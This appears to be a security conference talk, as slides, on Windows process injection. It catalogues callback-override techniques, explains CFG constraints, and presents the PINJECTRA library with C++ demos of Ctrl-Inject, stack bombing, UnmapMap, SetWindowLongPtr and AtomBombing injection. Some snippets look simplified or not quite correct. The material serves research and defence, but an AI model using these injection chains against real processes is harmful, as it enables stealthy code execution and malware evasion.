### Control Flow Guard (CFG)
- All original CFG-valid addresses in NTDLL should remain CFG-valid; otherwise, the process may crash.
- Both `VirtualAllocEx` and `NtMapViewOfSection` set the entire section to CFG-valid when `PAGE_EXECUTE` is requested.

### Control Flow Integrity Guard (CIG)
- Not relevant in this context.

### Control over Registers
- No control over registers.

### Process Stability
- To avoid destabilizing the process:
  - Suspend the process globally.
  - Copy the complete NTDLL memory, including static variables.

### Callback Override Execution Techniques
- **SetWindowLongPtr** (or **SetWindowLong**)
- **PROPagate**
- **Kernel Callback Table**
- **Ctrl-Inject**
- **Service Control**
- **USERDATA**
- **ALPC callback**
- **CLIBRDWNDCLASS**
- **DnsQuery**
- **WNF callback**
- **Shatter-like Techniques:**
  - **WordWarping**
  - **Hyphentension**
  - **AutoCourgette**
  - **Streamception**
  - **Oleum**
  - **ListPLanting**
  - **Treepoline**

### Concept
1. **Write Code to the Target Process:**
   - Use a writing technique to inject code into the target process.
2. **Find/Obtain Memory Address:**
   - Identify the memory address of an object (with vtbl) or a callback function.
   - This can be challenging and requires knowledge that the process has the object/callback (e.g., ALPC, console apps, private clipboard).
   - Methods to find the address include:
     - Using APIs (e.g., `GetWindowLongPtr`)
     - Memory search (e.g., for ALPC)
3. **Replace the Object/Callback:**
   - Replace the object/callback with a pointer to your chosen function/code using a writing technique or standard API.
   - Ensure the target is CFG-valid.
   - Adjustments to the object/code may be necessary.
4. **Trigger Execution:**
   - Trigger the execution, which can be tricky (e.g., `DnsQuery`).
   - Optionally, restore the original object/callback after execution.

### Ctrl-Inject Execution Technique
```cpp
HANDLE h = OpenProcess(PROCESS_VM_OPERATION, FALSE, process_id); // PROCESS_VM_OPERATION is required for RtlEncodeRemotePointer
void* encoded_addr = NULL;
RtlEncodeRemotePointer(h, target_execution, &encoded_addr);
// Use any Memory Write technique here to copy encoded_addr to kernelbase!SingleHandler in the target process
INPUT ip;
ip.type = INPUT_KEYBOARD;
ip.ki.wScan = 0;
ip.ki.time = 0;
ip.ki.dwExtraInfo = 0;
ip.ki.wVk = VK_CONTROL;
ip.ki.dwFlags = 0; // 0 for key press
SendInput(1, &ip, sizeof(INPUT));
Sleep(100);
PostMessageA(hWindow, WM_KEYDOWN, 'C', 0); // hWindow is a handle to the application window
```

### Memset/Memmove Write Technique
```cpp
HMODULE ntdll = GetModuleHandleA("ntdll");
HANDLE t = OpenThread(THREAD_SET_CONTEXT, FALSE, thread_id);
for (int i = 0; i < size; ++i) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_ALL;
    GetThreadContext(t, &ctx);
    ctx.Rsp -= sizeof(void*);
    ctx.Rip = (DWORD64)&encoded_addr;
    SetThreadContext(t, &ctx);
}
```

### Stack Bombing Demo
```cpp
GhostWritingImpl e = new CodeViaThreadSuspendInjectAndResume_ChangeRspChangeRip_Complex(
    new GhostWriting(new _ROP_CHAIN_2())
);
e->inject(pid, tid);
```

### UnmapMap Demo
```cpp
UnmapMapImpl e = new CodeViaProcessSuspendInjectAndResume_Complex(
    new CreateFileMappingA_MapViewOfFile_NtUnmapViewOfSection_NtMapViewOfSection(
        new _PAYLOAD_5()
    )
);
e->inject(pid, tid);
```

### SetWindowLongPtr Demo
```cpp
SetWindowLongPtrImpl e = new CodeViaSetWindowLongPtrA(
    new ComplexToMutableAdvanceMemoryWriter(
        new _PAYLOAD_4(),
        new VirtualAllocEx_WriteProcessMemory(
            NULL,
            0,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
    )
);
e->inject(pid, tid);
```

### Atom Bombing Demo
```cpp
AtomBombingImpl e = new CodeViaQueueUserAPC(
    new OpenThread_OpenProcess_VirtualAllocEx_GlobalAddAtomA(
        _gen_payload_2(),
        PAYLOAD3_SIZE,
        PROCESS_ALL_ACCESS,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE
    )
);
e->inject(pid, tid);
```

### Summary
- We map the extensive landscape of "true" process injection and provide a comprehensive analysis and comparison in a single repository.
- We offer a library (PINJECTRA) for generating and combining various process injection attacks.
- We introduce a new CFG-agnostic execution technique called stack bombing and a memory writing technique using `memset/memmove` over APC.

Thank you!
Questions?